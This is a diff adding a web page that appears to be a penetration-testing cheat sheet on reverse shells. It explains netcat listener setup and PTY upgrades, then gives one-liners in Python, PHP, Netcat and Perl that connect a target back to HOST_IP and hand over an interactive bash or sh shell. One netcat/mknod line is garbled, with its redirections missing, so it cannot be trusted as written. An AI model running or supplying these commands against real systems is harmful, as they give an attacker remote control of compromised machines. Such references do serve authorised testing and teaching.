@@ -1,0 +1,40 @@
+<main><section class="utils_articlePage__sM9Xw"><h1>Reverse Shells</h1>
+<p>To setup a host to listen for incoming connections on port 4444.</p>
+<pre><code>$ nc -nvlp 4444</code></pre>
+<h2>Transmitting from Target</h2>
+<p>For Unix/Linux reverse shells, the Python one is usually the best if the target has Python, much more likely to work.</p>
+<p>You need to replace HOST_IP with the IP address of your host machine. The host needs to be exposing the selected port (here 4444) such that the target can access it.</p>
+<p>After getting a reverse shell, you're likely to want to upgrade to a PTY and passthrough commands like <code>Ctrl-c</code> and <code>Ctrl-z</code>.</p>
+<h3>Spawning a PTY</h3>
+<p>Once inside a reverse shell, many commands such as <code>su</code>, <code>nano</code> and <code>vim</code> require a PTY in order to run. We can do this quite easily with any of the options below.</p>
+<p>After spawning a PTY, you're likely to want to passthrough commands like <code>Ctrl-c</code> and <code>Ctrl-z</code>.</p>
+<h3>Passing All Commands</h3>
+<p>There's a couple of ways to pass through commands from the host to the target reverse shell but the simplest and most versatile uses some magic around netcat and works almost every time!</p>
+<ol>
+<li>Once in your reverse shell, you want to hit <code>Ctrl-z</code> to background it.</li>
+<li>Then you want to tell your terminal session to echo all commands through to the target with <code>stty raw -echo</code>.</li>
+<li>Now you can bring your shell back to the foreground with <code>fg</code>. Alignment might be off; use <code>reset</code> to fix this.</li>
+<li>Finally you can set some environment variables such that editors like nano can run correctly in your session.</li>
+</ol>
+<pre><code>$ export SHELL=bash
+$ export TERM=xterm</code></pre>
+<h4>Quick Reference</h4>
+<pre><code>Ctrl-z
+$ stty raw -echo
+$ fg
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm</code></pre>
+<h2>Python</h2>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HOST_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</code></pre>
+<h2>PHP</h2>
+<pre><code>php -r '$sock=fsockopen("HOST_IP",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
+<h2>Netcat</h2>
+<pre><code>nc -e /bin/bash HOST_IP 4444</code></pre>
+<pre><code>/bin/bash | nc HOST_IP 4444</code></pre>
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc HOST_IP 4444 0/tmp/p</code></pre>
+<h2>Perl</h2>
+<pre><code>perl -e 'use Socket;$i="HOST_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</code></pre>
+<h2>References</h2>
+<p><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet</a></p>
+</section></main>
